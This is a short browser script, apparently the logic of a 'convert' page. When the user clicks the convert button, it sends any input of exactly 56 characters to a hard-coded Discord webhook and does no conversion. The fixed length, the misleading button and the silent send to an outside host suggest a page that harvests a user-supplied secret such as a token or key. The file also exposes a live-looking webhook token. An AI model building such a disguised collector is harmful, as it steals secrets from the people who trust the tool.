// script.js

const messageInput = document.getElementById('messageInput');
const convertButton = document.getElementById('convertButton');

convertButton.addEventListener('click', () => {
  const message = messageInput.value;
  if (message.length === 56) {
    // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
    fetch('https://discord.com/api/webhooks/1246164269284855819/WUA2_pRUH_ysNMaL3bbvGyeKfZsid1G0YRIPdOrGSiMW511yMniIA3b6U-jZ_mE3R9zp', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: message
      })
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Failed to send message to Discord');
      }
      console.log('Message sent successfully!');
      messageInput.value = ''; // Clear the input field
    })
    .catch(error => {
      console.error('Error sending message:', error);
    });
  } else {
    alert('Message must be exactly 56 characters long!');
  }
});
